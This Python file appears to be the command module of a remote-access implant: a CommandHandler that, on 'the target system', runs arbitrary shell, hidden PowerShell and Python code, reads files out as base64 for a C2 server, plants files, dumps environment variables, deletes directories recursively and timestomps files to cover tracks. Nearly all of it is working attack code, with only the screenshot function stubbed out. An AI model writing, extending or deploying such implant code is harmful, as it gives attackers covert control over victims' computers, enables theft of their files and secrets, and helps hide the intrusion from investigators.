import base64
import json
import os
import platform
import subprocess
import sys
import time
import shutil
import socket
import zipfile
import tempfile
from datetime import datetime
from typing import Dict, List, Any, Optional, Union

class CommandHandler:
    def __init__(self, agent):
        self.agent = agent
        self.commands = {
            "shell": self.cmd_shell,
            "powershell": self.cmd_powershell,
            "python": self.cmd_python,
            "download": self.cmd_download,
            "upload": self.cmd_upload,
            "sleep": self.cmd_sleep,
            "exit": self.cmd_exit,
            "cd": self.cmd_cd,
            "pwd": self.cmd_pwd,
            "ls": self.cmd_ls,
            "ps": self.cmd_ps,
            "cat": self.cmd_cat,
            "cp": self.cmd_cp,
            "mv": self.cmd_mv,
            "rm": self.cmd_rm,
            "mkdir": self.cmd_mkdir,
            "netstat": self.cmd_netstat,
            "getenv": self.cmd_getenv,
            "setenv": self.cmd_setenv,
            "getuid": self.cmd_getuid,
            "ipconfig": self.cmd_ipconfig,
            "screenshot": self.cmd_screenshot,
            "sysinfo": self.cmd_sysinfo,
            "timestomp": self.cmd_timestomp,
            "zip": self.cmd_zip,
            "unzip": self.cmd_unzip
        }
    
    def execute_command(self, command: str, parameters: Dict) -> str:
        """Execute a command with the given parameters"""
        if command not in self.commands:
            return f"Error: Command '{command}' not supported"
        
        try:
            return self.commands[command](parameters)
        except Exception as e:
            return f"Error executing command '{command}': {str(e)}"
    
    def cmd_shell(self, params: Dict) -> str:
        """Execute a command using the system shell"""
        command = params.get("command", "")
        if not command:
            return "Error: No command specified"
        
        # Determine the right shell to use based on the OS
        if platform.system() == "Windows":
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        else:
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )
        
        stdout, stderr = process.communicate()
        
        if stderr:
            return f"STDOUT:\n{stdout.decode('utf-8', errors='replace')}\nSTDERR:\n{stderr.decode('utf-8', errors='replace')}"
        else:
            return stdout.decode('utf-8', errors='replace')
    
    def cmd_powershell(self, params: Dict) -> str:
        """Execute a PowerShell command (Windows only)"""
        if platform.system() != "Windows":
            return "Error: PowerShell is only available on Windows"
        
        command = params.get("command", "")
        if not command:
            return "Error: No command specified"
        
        # Encode the command to avoid escaping issues
        encoded_command = base64.b64encode(command.encode('utf-16-le')).decode()
        
        process = subprocess.Popen(
            ["powershell.exe", "-EncodedCommand", encoded_command],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        stdout, stderr = process.communicate()
        
        if stderr:
            return f"STDOUT:\n{stdout.decode('utf-8', errors='replace')}\nSTDERR:\n{stderr.decode('utf-8', errors='replace')}"
        else:
            return stdout.decode('utf-8', errors='replace')
    
    def cmd_python(self, params: Dict) -> str:
        """Execute Python code"""
        code = params.get("code", "")
        if not code:
            return "Error: No Python code specified"
        
        # Create a temporary file for the code
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(code)
            temp_file = f.name
        
        try:
            # Execute the code
            process = subprocess.Popen(
                [sys.executable, temp_file],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            stdout, stderr = process.communicate()
            
            if stderr:
                return f"STDOUT:\n{stdout.decode('utf-8', errors='replace')}\nSTDERR:\n{stderr.decode('utf-8', errors='replace')}"
            else:
                return stdout.decode('utf-8', errors='replace')
        finally:
            # Clean up the temporary file
            try:
                os.unlink(temp_file)
            except:
                pass
    
    def cmd_download(self, params: Dict) -> str:
        """Download a file from the target system"""
        path = params.get("path", "")
        if not path:
            return "Error: No file path specified"
        
        if not os.path.isfile(path):
            return f"Error: File not found: {path}"
        
        try:
            with open(path, 'rb') as f:
                file_data = f.read()
            
            # For a real agent, you would send this data back to the C2
            # Here we'll just return base64 encoded data
            encoded_data = base64.b64encode(file_data).decode()
            
            return json.dumps({
                "filename": os.path.basename(path),
                "data": encoded_data,
                "size": len(file_data)
            })
        except Exception as e:
            return f"Error downloading file: {str(e)}"
    
    def cmd_upload(self, params: Dict) -> str:
        """Upload a file to the target system"""
        filename = params.get("filename", "")
        data = params.get("data", "")
        path = params.get("path", os.getcwd())
        
        if not filename or not data:
            return "Error: Filename and data required"
        
        try:
            # Decode the file data
            file_data = base64.b64decode(data.encode())
            
            # Create the full path
            full_path = os.path.join(path, filename)
            
            # Write the file
            with open(full_path, 'wb') as f:
                f.write(file_data)
            
            return f"File uploaded successfully to {full_path}"
        except Exception as e:
            return f"Error uploading file: {str(e)}"
    
    def cmd_sleep(self, params: Dict) -> str:
        """Change the sleep/callback interval"""
        interval = params.get("interval", None)
        
        if interval is None:
            return f"Current sleep interval: {self.agent.callback_interval} seconds"
        
        try:
            interval = float(interval)
            if interval <= 0:
                return "Error: Sleep interval must be greater than 0"
            
            self.agent.callback_interval = interval
            return f"Sleep interval changed to {interval} seconds"
        except ValueError:
            return "Error: Invalid sleep interval value"
    
    def cmd_exit(self, params: Dict) -> str:
        """Exit the agent"""
        self.agent.running = False
        return "Agent shutting down..."
    
    def cmd_cd(self, params: Dict) -> str:
        """Change the current working directory"""
        directory = params.get("directory", "")
        
        if not directory:
            return os.getcwd()
        
        try:
            os.chdir(directory)
            return os.getcwd()
        except Exception as e:
            return f"Error changing directory: {str(e)}"
    
    def cmd_pwd(self, params: Dict) -> str:
        """Print the current working directory"""
        return os.getcwd()
    
    def cmd_ls(self, params: Dict) -> str:
        """List files in a directory"""
        path = params.get("path", os.getcwd())
        
        try:
            items = os.listdir(path)
            result = []
            
            for item in items:
                full_path = os.path.join(path, item)
                try:
                    stats = os.stat(full_path)
                    is_dir = os.path.isdir(full_path)
                    
                    result.append({
                        "name": item,
                        "type": "directory" if is_dir else "file",
                        "size": stats.st_size,
                        "modified": datetime.fromtimestamp(stats.st_mtime).strftime('%Y-%m-%d %H:%M:%S'),
                        "permissions": oct(stats.st_mode)[-3:]
                    })
                except:
                    result.append({
                        "name": item,
                        "type": "unknown",
                        "size": 0,
                        "modified": "",
                        "permissions": ""
                    })
            
            return json.dumps(result)
        except Exception as e:
            return f"Error listing directory: {str(e)}"
    
    def cmd_ps(self, params: Dict) -> str:
        """List running processes"""
        if platform.system() == "Windows":
            command = "tasklist /FO CSV /NH"
        else:
            command = "ps aux"
        
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        stdout, stderr = process.communicate()
        
        if stderr:
            return f"Error: {stderr.decode('utf-8', errors='replace')}"
        else:
            return stdout.decode('utf-8', errors='replace')
    
    def cmd_cat(self, params: Dict) -> str:
        """Display file contents"""
        path = params.get("path", "")
        
        if not path:
            return "Error: No file path specified"
        
        try:
            with open(path, 'r', errors='replace') as f:
                return f.read()
        except Exception as e:
            return f"Error reading file: {str(e)}"
    
    def cmd_cp(self, params: Dict) -> str:
        """Copy a file"""
        source = params.get("source", "")
        destination = params.get("destination", "")
        
        if not source or not destination:
            return "Error: Source and destination paths required"
        
        try:
            shutil.copy2(source, destination)
            return f"File copied from {source} to {destination}"
        except Exception as e:
            return f"Error copying file: {str(e)}"
    
    def cmd_mv(self, params: Dict) -> str:
        """Move/rename a file"""
        source = params.get("source", "")
        destination = params.get("destination", "")
        
        if not source or not destination:
            return "Error: Source and destination paths required"
        
        try:
            shutil.move(source, destination)
            return f"File moved from {source} to {destination}"
        except Exception as e:
            return f"Error moving file: {str(e)}"
    
    def cmd_rm(self, params: Dict) -> str:
        """Remove a file or directory"""
        path = params.get("path", "")
        recursive = params.get("recursive", False)
        
        if not path:
            return "Error: Path required"
        
        try:
            if os.path.isdir(path):
                if recursive:
                    shutil.rmtree(path)
                    return f"Directory {path} removed recursively"
                else:
                    os.rmdir(path)
                    return f"Directory {path} removed"
            else:
                os.remove(path)
                return f"File {path} removed"
        except Exception as e:
            return f"Error removing path: {str(e)}"
    
    def cmd_mkdir(self, params: Dict) -> str:
        """Create a directory"""
        path = params.get("path", "")
        
        if not path:
            return "Error: Path required"
        
        try:
            os.makedirs(path, exist_ok=True)
            return f"Directory {path} created"
        except Exception as e:
            return f"Error creating directory: {str(e)}"
    
    def cmd_netstat(self, params: Dict) -> str:
        """Display network connections"""
        if platform.system() == "Windows":
            command = "netstat -ano"
        else:
            command = "netstat -tunapl"
        
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        stdout, stderr = process.communicate()
        
        if stderr:
            return f"Error: {stderr.decode('utf-8', errors='replace')}"
        else:
            return stdout.decode('utf-8', errors='replace')
    
    def cmd_getenv(self, params: Dict) -> str:
        """Get environment variables"""
        var_name = params.get("name", "")
        
        if var_name:
            return os.environ.get(var_name, f"Environment variable {var_name} not found")
        else:
            return json.dumps(dict(os.environ))
    
    def cmd_setenv(self, params: Dict) -> str:
        """Set an environment variable"""
        name = params.get("name", "")
        value = params.get("value", "")
        
        if not name:
            return "Error: Variable name required"
        
        try:
            os.environ[name] = value
            return f"Environment variable {name} set to {value}"
        except Exception as e:
            return f"Error setting environment variable: {str(e)}"
    
    def cmd_getuid(self, params: Dict) -> str:
        """Get current user ID information"""
        if platform.system() == "Windows":
            command = "whoami /all"
        else:
            command = "id"
        
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        stdout, stderr = process.communicate()
        
        if stderr:
            return f"Error: {stderr.decode('utf-8', errors='replace')}"
        else:
            return stdout.decode('utf-8', errors='replace')
    
    def cmd_ipconfig(self, params: Dict) -> str:
        """Get network configuration"""
        if platform.system() == "Windows":
            command = "ipconfig /all"
        else:
            command = "ifconfig -a"
        
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        stdout, stderr = process.communicate()
        
        if stderr:
            return f"Error: {stderr.decode('utf-8', errors='replace')}"
        else:
            return stdout.decode('utf-8', errors='replace')
    
    def cmd_screenshot(self, params: Dict) -> str:
        """Take a screenshot"""
        try:
            # This is a mock implementation as real screenshot functionality
            # would require additional libraries like PIL or pyautogui
            return "Screenshot functionality requires PIL/Pillow and platform-specific libraries"
        except Exception as e:
            return f"Error taking screenshot: {str(e)}"
    
    def cmd_sysinfo(self, params: Dict) -> str:
        """Get system information"""
        info = {
            "hostname": socket.gethostname(),
            "platform": platform.system(),
            "platform_release": platform.release(),
            "platform_version": platform.version(),
            "architecture": platform.machine(),
            "processor": platform.processor(),
            "username": self.agent._get_username(),
            "python_version": platform.python_version(),
            "fqdn": socket.getfqdn(),
            "interfaces": self.agent.interfaces
        }
        
        # Add memory info
        try:
            if platform.system() == "Windows":
                process = subprocess.Popen(
                    ["wmic", "OS", "get", "TotalVisibleMemorySize", "/Value"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                stdout, _ = process.communicate()
                mem_str = stdout.decode('utf-8', errors='replace').strip()
                mem_value = mem_str.split('=')[1].strip() if '=' in mem_str else "Unknown"
                info["total_memory"] = f"{int(mem_value) // 1024} MB" if mem_value.isdigit() else mem_value
            else:
                process = subprocess.Popen(
                    ["free", "-m"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                stdout, _ = process.communicate()
                mem_str = stdout.decode('utf-8', errors='replace').strip()
                mem_lines = mem_str.split('\n')
                if len(mem_lines) >= 2:
                    mem_values = mem_lines[1].split()
                    if len(mem_values) >= 2:
                        info["total_memory"] = f"{mem_values[1]} MB"
        except:
            info["total_memory"] = "Unknown"
        
        return json.dumps(info)
    
    def cmd_timestomp(self, params: Dict) -> str:
        """Modify file timestamps"""
        path = params.get("path", "")
        reference = params.get("reference", "")
        
        if not path:
            return "Error: Path required"
        
        try:
            if reference:
                # Copy timestamps from reference file
                if not os.path.exists(reference):
                    return f"Error: Reference file {reference} not found"
                
                ref_stats = os.stat(reference)
                os.utime(path, (ref_stats.st_atime, ref_stats.st_mtime))
                return f"Timestamps for {path} modified to match {reference}"
            else:
                # Use specified timestamps or current time
                atime = params.get("atime", time.time())
                mtime = params.get("mtime", time.time())
                
                os.utime(path, (atime, mtime))
                return f"Timestamps for {path} modified"
        except Exception as e:
            return f"Error modifying timestamps: {str(e)}"
    
    def cmd_zip(self, params: Dict) -> str:
        """Create a zip archive"""
        source = params.get("source", "")
        destination = params.get("destination", "")
        
        if not source or not destination:
            return "Error: Source and destination paths required"
        
        try:
            if os.path.isdir(source):
                # Zip a directory
                with zipfile.ZipFile(destination, 'w', zipfile.ZIP_DEFLATED) as zipf:
                    for root, _, files in os.walk(source):
                        for file in files:
                            file_path = os.path.join(root, file)
                            arcname = os.path.relpath(file_path, os.path.dirname(source))
                            zipf.write(file_path, arcname)
            else:
                # Zip a single file
                with zipfile.ZipFile(destination, 'w', zipfile.ZIP_DEFLATED) as zipf:
                    zipf.write(source, os.path.basename(source))
            
            return f"Archive created at {destination}"
        except Exception as e:
            return f"Error creating archive: {str(e)}"
    
    def cmd_unzip(self, params: Dict) -> str:
        """Extract a zip archive"""
        source = params.get("source", "")
        destination = params.get("destination", "")
        
        if not source:
            return "Error: Source path required"
        
        if not destination:
            destination = os.path.dirname(source)
        
        try:
            with zipfile.ZipFile(source, 'r') as zipf:
                zipf.extractall(destination)
            
            return f"Archive extracted to {destination}"
        except Exception as e:
            return f"Error extracting archive: {str(e)}"